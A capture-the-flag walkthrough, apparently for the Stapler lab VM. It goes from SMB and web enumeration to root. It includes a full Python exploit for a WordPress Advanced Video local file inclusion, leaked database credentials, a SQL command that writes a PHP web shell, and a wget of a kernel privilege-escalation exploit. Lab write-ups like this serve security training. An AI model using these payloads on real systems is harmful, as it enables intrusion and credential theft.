S-1-5-21-864226560-67800430-3082388513-1037 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1038 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1039 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1040 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1041 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1042 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1043 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1044 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1045 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1046 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1047 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1048 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1049 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1050 *unknown*\*unknown* (8)

 ============================================== 
|    Getting printer info for 192.168.0.107    |
 ============================================== 
No printers returned.


enum4linux complete on Wed Jan 26 18:17:01 2022

>> In kathy share found two directories.
>> 1]  kathy_stuff
>> 2] backup

>> in kathy_stuff folder todo-list.txt file is found.
    ->> I'm making sure to backup anything important for Initech, Kathy
>> in backup folder,wordpress site backup is present

>> In tmp share only "ls" names file is present.
    ->> total 12.0K
    drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
    drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
    -rw-r--r--  1 root root    0 Jun  5 16:32 ls
    drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ

>> on port 12380 https service is running.
>> gobuster dirsearch:

/.hta                 (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 300]
/announcements        (Status: 301) [Size: 332] [--> https://192.168.0.107:12380/announcements/]
/index.html           (Status: 200) [Size: 21]                                                  
/javascript           (Status: 301) [Size: 329] [--> https://192.168.0.107:12380/javascript/]   
/phpmyadmin           (Status: 301) [Size: 329] [--> https://192.168.0.107:12380/phpmyadmin/]   
/robots.txt           (Status: 200) [Size: 59]                                                  
/server-status        (Status: 403) [Size: 304]   

>> In announcements dirctory -> message.txt:
	->> Abby, we need to link the folder somewhere! Hidden at the mo
>> robots.txt file shows two directories:
	->> Disallow: /admin112233/
		Disallow: /blogblog/
>> run dirsearch on url:http://<IP:12380/blagblog/>

[20:42:57] 301 -    0B  - /blogblog/index.php  ->  https://192.168.0.107:12380/blogblog/
[20:42:57] 301 -    0B  - /blogblog/index.php/login/  ->  https://192.168.0.107:12380/blogblog/login/
[20:43:01] 200 -   19KB - /blogblog/license.txt
[20:43:19] 200 -    7KB - /blogblog/readme.html
[20:43:38] 301 -  336B  - /blogblog/wp-admin  ->  https://192.168.0.107:12380/blogblog/wp-admin/
[20:43:38] 200 -    1KB - /blogblog/wp-content/
[20:43:39] 301 -  338B  - /blogblog/wp-content  ->  https://192.168.0.107:12380/blogblog/wp-content/
[20:43:39] 200 -    0B  - /blogblog/wp-config.php
[20:43:39] 200 -    1B  - /blogblog/wp-admin/admin-ajax.php
[20:43:39] 403 -  336B  - /blogblog/wp-content/plugins/akismet/admin.php
[20:43:39] 403 -  338B  - /blogblog/wp-content/plugins/akismet/akismet.php
[20:43:39] 500 -    0B  - /blogblog/wp-content/plugins/hello.php
[20:43:39] 200 -  807B  - /blogblog/wp-content/uploads/
[20:43:39] 302 -    0B  - /blogblog/wp-admin/  ->  https://192.168.0.107:12380/blogblog/wp-login.php?redirect_to=https%3A%2F%2F192.168.0.107%3A12380%2Fblogblog%2Fwp-admin%2F&reauth=1
[20:43:39] 200 -    1KB - /blogblog/wp-admin/install.php
[20:43:39] 500 -    3KB - /blogblog/wp-admin/setup-config.php
[20:43:39] 301 -  339B  - /blogblog/wp-includes  ->  https://192.168.0.107:12380/blogblog/wp-includes/
[20:43:40] 200 -    0B  - /blogblog/wp-cron.php
[20:43:40] 500 -    0B  - /blogblog/wp-includes/rss-functions.php
[20:43:40] 200 -    3KB - /blogblog/wp-login.php
[20:43:40] 302 -    0B  - /blogblog/wp-signup.php  ->  https://192.168.0.107:12380/blogblog/wp-login.php?action=register
[20:43:40] 200 -   26KB - /blogblog/wp-includes/
[20:43:41] 405 -   42B  - /blogblog/xmlrpc.php


>> In directory wp-content -> plugin -> advanced vedio plugin is vulnerable.
	->> searchsploit advanced vedio:
		->> WordPress Plugin Advanced Video 1.0 - Local File Inclusion                                                      | php/webapps/39646.py
# Script:

##################################

#!/usr/bin/python3


import random
from urllib.request import urlopen
import re
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = "https://192.168.0.107:12380/blogblog"

file_path = '../wp-config.php'

randomID = str(int(random.random() * 100000000000))

objHtml = urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + randomID + '&short=rnd&term=rnd&thumb=' + file_path, context=ctx)
content = objHtml.readlines()


for line in content:
    numbers = re.findall(r'\d+', str(line))
    id = numbers[-1]
    id = int(id) / 10

objHtml = urlopen(url, context=ctx)
content = str(objHtml.readlines())

linkstring = re.findall(str(int(id)) + '".*?\.jpeg', content)[0]
jpglink = linkstring.split('src="')[-1]

print(urlopen(jpglink, context=ctx).read().decode())

################################

>> using lfi grab the wp-config.php file in which password and username are present

define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

>> login in phpmyadmin portal
>> run the following script:
	->> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/cmd.php' 
>> visit the uploads directory -> command injection.
>> got a reverse shell as www-data.

>> check kernal version: 4.4.0-21-generic:
		->> Vulnerbility : double-fdput()
		->> Download : wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

# proof.txt :

~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

